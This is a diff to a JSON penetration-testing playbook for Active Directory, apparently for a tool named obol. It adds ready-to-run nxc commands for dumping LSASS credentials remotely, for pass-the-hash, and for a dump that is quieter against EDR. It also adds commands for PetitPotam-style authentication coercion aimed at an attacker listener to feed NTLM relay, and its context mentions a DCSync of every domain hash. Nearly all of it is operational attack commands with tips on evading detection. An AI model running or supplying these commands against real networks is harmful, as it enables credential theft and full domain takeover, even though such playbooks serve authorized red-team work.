@@ -1043,9 +1043,14 @@
           "note": "ON A DC: the whole domain (every hash, krbtgt included) through DRSUAPI, one line, no mimikatz. Switch to --ntds vss for a shadow-copy snapshot when replication traffic is being monitored."
         },
         {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M lsassy",
+          "note": "Remote LSASS dump from Kali, the preferred alternative to getting on the box with mimikatz/procdump: nxc drives lsassy to pull logged-on plaintext and NT hashes over SMB. Use -H {{hash}} for pass-the-hash. Try -M nanodump for an EDR-quieter dump of the same memory. This is the remote twin of the on-host LSASS dump."
+        },
+        {
           "tool": "mimikatz",
           "run": "privilege::debug",
-          "note": "Always elevate before anything else."
+          "note": "On-host fallback (needs an interactive session on the box). Always elevate before anything else."
         },
         {
           "tool": "mimikatz",
@@ -2468,8 +2473,9 @@
       "id": "coerce-auth",
       "title": "Authentication Coercion (PetitPotam / PrinterBug / DFSCoerce)",
       "hypothesis": "A DC or server can be forced to authenticate to a host you control over MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), or MS-DFSNM (DFSCoerce). That coerced machine authentication is the trigger the relay lane needs: relay it to LDAP for RBCD, to the ADCS web endpoint for ESC8, or capture the DC's TGT on an unconstrained-delegation host. obol already ships Responder, ntlmrelayx, and mitm6, coercion is the missing spark.",
-      "tool": "coercer",
+      "tool": "nxc",
       "tools": [
+        "nxc",
         "coercer",
         "PetitPotam.py",
         "printerbug.py",
@@ -2507,9 +2513,14 @@
       ],
       "commands": [
         {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M coerce_plus -o LISTENER={{lhost}}",
+          "note": "PREFERRED, from Kali: nxc's coerce_plus checks which coercion vectors (MS-EFSR/MS-RPRN/MS-DFSNM/MS-FSRVP) the target answers and fires them at your listener ({{lhost}}) in one module. Run -o LISTENER=... ALWAYS; add METHOD=PetitPotam to pin one. Start Responder or ntlmrelayx on {{lhost}} FIRST. Drop -u/-p for the unauth PetitPotam paths some DCs still allow."
+        },
+        {
           "tool": "coercer",
           "run": "coercer coerce --always-continue -t {{target}} -l {{lhost}} -u {{user}} -p '{{password}}' -d {{domain}}",
-          "note": "Fire every known coercion method at the DC, aimed at your listener ({{lhost}}). --always-continue walks all methods without the per-method Continue/Skip/Stop prompt (so it runs unattended, not blocked on input). Start Responder or ntlmrelayx on {{lhost}} FIRST. Drop -u/-p for the unauth PetitPotam paths some DCs still allow."
+          "note": "The dedicated multi-method alternative when coerce_plus misses a vector: fire every known coercion method at the DC, aimed at your listener ({{lhost}}). --always-continue walks all methods without the per-method Continue/Skip/Stop prompt (so it runs unattended, not blocked on input). Start Responder or ntlmrelayx on {{lhost}} FIRST."
         },
         {
           "tool": "PetitPotam.py",
